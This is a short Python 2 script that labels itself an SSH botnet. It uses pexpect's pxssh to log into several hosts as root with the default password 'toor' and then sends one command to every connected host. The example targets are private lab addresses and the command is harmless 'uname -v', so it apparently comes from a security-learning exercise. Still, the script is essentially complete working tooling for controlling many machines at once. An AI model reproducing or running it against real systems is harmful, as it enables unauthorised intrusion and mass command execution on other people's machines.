"""A SSH botnet."""
from pexpect import pxssh


class Client:
    """Class client that defines a ssh bot.

    The bot can connect and control multiple host targets.
    """

    def __init__(self, host, user, password):
        """Initialize class variables."""
        self.host = host
        self.user = user
        self.password = password
        self.session = self.connect()

    def send_command(self, cmd):
        """Send the command string to SSH session and waits for cmd."""
        self.session.sendline(cmd)
        self.session.prompt()
        return self.session.before

    def connect(self):
        """Function esptablishes a SSH connection to a target host."""
        try:
            s = pxssh.pxssh()
            s.login(self.host, self.user, self.password)
            return s
        except Exception, e:
            print e
            print '[-] Error Connecting'


def botnet_command(command):
    """Send and display the botnet ssh command."""
    for client in botnet:
        output = client.send_command(command)
        print '[*] Output from ' + client.host
        print '[+] ' + output + '\n'


def add_client(host, user, password):
    """Instantiate a client."""
    client = Client(host, user, password)
    botnet.append(client)

botnet = []
add_client('192.168.8.2', 'root', 'toor')
add_client('192.168.8.3', 'root', 'toor')
add_client('192.168.8.4', 'root', 'toor')
botnet_command('uname -v')
